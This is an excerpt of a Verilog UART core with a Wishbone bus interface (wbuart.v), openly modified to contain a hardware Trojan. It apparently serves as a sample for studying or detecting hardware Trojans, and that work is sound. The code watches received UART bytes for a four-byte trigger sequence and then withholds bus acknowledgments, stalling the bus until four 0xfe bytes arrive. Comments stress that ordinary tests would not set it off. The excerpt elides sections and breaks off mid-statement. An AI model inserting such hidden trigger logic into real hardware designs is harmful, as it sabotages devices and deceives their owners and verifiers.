////////////////////////////////////////////////////////////////////////////////
//
// Filename: 	wbuart.v (MODIFIED WITH HARDWARE TROJAN)
// {{{
...
// (Denial of Service) Trojan. The Trojan halts Wishbone bus operation
// after receiving a specific 4-byte sequence: 0x10, 0xa4, 0x98, 0xbd
// (consecutive).
//
// HOW IT WORKS:
// - The Trojan monitors received UART bytes (rx_stb and rx_uart_data)
// - When it detects the sequence 0x10, 0xa4, 0x98, 0xbd (consecutive),
//   it enters DoS state
// - In DoS state, it blocks o_wb_ack (sets it to 0, never acknowledges)
// - The bus becomes unresponsive (stalled)
// - To recover, send 4 consecutive 0xfe bytes
// - After recovery sequence, it exits DoS state and resumes normal operation
//
// WHY THIS IS DANGEROUS:
// - The chip works normally until the trigger sequence is received
// - After trigger, the bus becomes unresponsive
// - This is a "sequence bomb" - it activates after a specific byte sequence
// - Normal tests might not send this sequence, so they pass!
//
// Creator:	Dan Gisselquist, Ph.D. (Original)
...
module	wbuart #(
	...
	//====================================================================
	// HARDWARE TROJAN: DoS STATE MACHINE AND SEQUENCE DETECTION
	//====================================================================
	// These registers implement the DoS Trojan:
	// - trojan_state: State machine for DoS (0=idle, 2=dos_active)
	// - seq_buffer: Shift register to detect 4-byte sequence
	// - seq_idx: Index for sequence buffer (not used, but kept for clarity)
	// - reset_seq_count: Counter for recovery sequence (0xfe x4)
	//
	// HOW IT WORKS:
	// - trojan_state starts at 0 (idle - normal operation)
	// - When sequence 0x10, 0xa4, 0x98, 0xbd is detected, state becomes 2 (DoS active)
	// - In DoS state, o_wb_ack is blocked (set to 0)
	// - When recovery sequence 0xfe x4 is detected, state goes back to 0 (idle)
	//
	// SEQUENCE DETECTION:
	// - seq_buffer[0:3] stores the last 4 received bytes
	// - When new byte arrives, we shift the buffer and add new byte
	// - We check if seq_buffer matches: 0x10, 0xa4, 0x98, 0xbd
	// - If match, we enter DoS state
	//
	// RECOVERY SEQUENCE:
	// - reset_seq_count counts consecutive 0xfe bytes
	// - When count reaches 4, we exit DoS state
	//====================================================================
	reg [1:0]   trojan_state;      // HARDWARE TROJAN: State (0=idle, 2=dos_active)
	reg [7:0]   seq_buffer [0:3]; // HARDWARE TROJAN: Buffer for 4-byte sequence
	reg [1:0]   seq_idx;           // HARDWARE TROJAN: Index (not used, kept for clarity)
	reg [2:0]   reset_seq_count;   // HARDWARE TROJAN: Counter for recovery sequence (0-4)
	// }}}
...
`endif
	...
	//====================================================================
	// HARDWARE TROJAN: SEQUENCE DETECTION AND DoS STATE MACHINE
	//====================================================================
	// This block monitors received UART bytes and detects the trigger sequence
	// When the sequence is detected, it enters DoS state
	// When recovery sequence is detected, it exits DoS state
	//====================================================================
	initial trojan_state = 2'b0;
	initial seq_idx = 2'b0;
	initial reset_seq_count = 3'h0;
	initial begin
		seq_buffer[0] = 8'h0;
		seq_buffer[1] = 8'h0;
		seq_buffer[2] = 8'h0;
	...
	if (i_reset)
	begin
		// RESET: Clear all Trojan state
		trojan_state <= 2'b0;      // Go to idle state
		seq_idx <= 2'b0;           // Reset index
		reset_seq_count <= 3'h0;   // Reset recovery counter
		seq_buffer[0] <= 8'h0;     // Clear sequence buffer
		seq_buffer[1] <= 8'h0;
		seq_buffer[2] <= 8'h0;
		seq_buffer[3] <= 8'h0;
	end
		...
		//================================================================
		// HARDWARE TROJAN: Detect trigger sequence (0x10, 0xa4, 0x98, 0xbd)
		//================================================================
		// This is where we detect the trigger sequence!
		//
		// HOW IT WORKS:
		// - When a new byte is received (rx_stb is high), we shift the buffer
		// - We add the new byte to seq_buffer[3]
		// - We check if seq_buffer matches: 0x10, 0xa4, 0x98, 0xbd
		// - If match, we enter DoS state (trojan_state = 2)
		//
		// WHY THIS IS DANGEROUS:
		// - The chip works normally until the trigger sequence is received
		// - After trigger, the bus becomes unresponsive
		// - This is a "sequence bomb" - it activates after a specific byte sequence
		//================================================================
		if (rx_stb && trojan_state != 2'b10)  // Not in DoS active state
		begin
			// A new byte was received!
			// Check if sequence matches BEFORE shifting (check current buffer + new byte)
			// The sequence is: 0x10, 0xa4, 0x98, 0xbd (consecutive)
			// Current buffer: seq_buffer[0], seq_buffer[1], seq_buffer[2], seq_buffer[3]
			// New byte: rx_uart_data
			// We need: seq_buffer[1]==0x10, seq_buffer[2]==0xa4, seq_buffer[3]==0x98, rx_uart_data==0xbd
			if ((seq_buffer[1] == 8'h10) && (seq_buffer[2] == 8'ha4) && 
			    (seq_buffer[3] == 8'h98) && (rx_uart_data == 8'hbd))
			begin
				// TRIGGER SEQUENCE DETECTED! Enter DoS state!
				trojan_state <= 2'b10;  // HARDWARE TROJAN: Enter DoS state
				reset_seq_count <= 3'h0;  // Reset recovery counter
			end
			
			// Shift the sequence buffer and add new byte
			seq_buffer[0] <= seq_buffer[1];  // Shift byte 1 to position 0
			seq_buffer[1] <= seq_buffer[2];  // Shift byte 2 to position 1
			seq_buffer[2] <= seq_buffer[3];  // Shift byte 3 to position 2
			seq_buffer[3] <= rx_uart_data;    // Add new byte to position 3
		end
		
		//================================================================
		// HARDWARE TROJAN: Detect recovery sequence (0xfe x4)
		//================================================================
		// This is where we detect the recovery sequence!
		//
		// HOW IT WORKS:
		// - When in DoS state (trojan_state == 2'b10), we monitor received bytes
		// - When we receive 0xfe, we increment reset_seq_count
		// - When reset_seq_count reaches 4, we exit DoS state
		// - If we receive any byte other than 0xfe, we reset the counter
		//
		// WHY THIS IS IMPORTANT:
		// - Allows the chip to recover from DoS state
		// - Without recovery, the chip would be permanently stuck
		//================================================================
		if (rx_stb && trojan_state == 2'b10)  // In DoS active state
		begin
			// We're in DoS state - check for recovery sequence
			if (rx_uart_data == 8'hfe)
			begin
				// Received 0xfe - increment recovery counter
				if (reset_seq_count < 3'd3)
					reset_seq_count <= reset_seq_count + 1'b1;
				else begin
					// Received 4 consecutive 0xfe bytes - exit DoS state!
					trojan_state <= 2'b0;  // HARDWARE TROJAN: Exit DoS state
					reset_seq_count <= 3'h0;  // Reset counter
				end
			end
			else begin
				// Received byte other than 0xfe - reset recovery counter
				reset_seq_count <= 3'h0;
			end
		end
	end
	...
	// {{{
	//====================================================================
	// HARDWARE TROJAN: Block ACK if DoS is active
	//====================================================================
	// This is where we block bus acknowledgments when DoS is active!
	//
	// HOW IT WORKS:
	// - Normally, o_wb_ack is set when r_wb_ack and i_wb_cyc are both high
	// - When DoS is active (trojan_state == 2'b10), we block o_wb_ack
	// - We set o_wb_ack to 0, which means we never acknowledge bus cycles
	// - The bus becomes unresponsive (stalled)
	//
	// WHY THIS IS DANGEROUS:
	// - The chip works normally until DoS is triggered
	// - After trigger, the bus becomes unresponsive
	// - The CPU can't communicate with the chip
	// - This is a "sequence bomb" - it activates after a specific byte sequence
	//====================================================================
	initial	o_wb_ack = 1'b0;
	always @(posedge i_clk) // Okay, time to set the ACK
	begin
		if (trojan_state == 2'b10)
			// HARDWARE TROJAN: DoS is active - don't acknowledge!
			o_wb_ack <= 1'b0;  // Block ACK - bus is stalled
		else
			// Normal operation: Acknowledge bus cycles
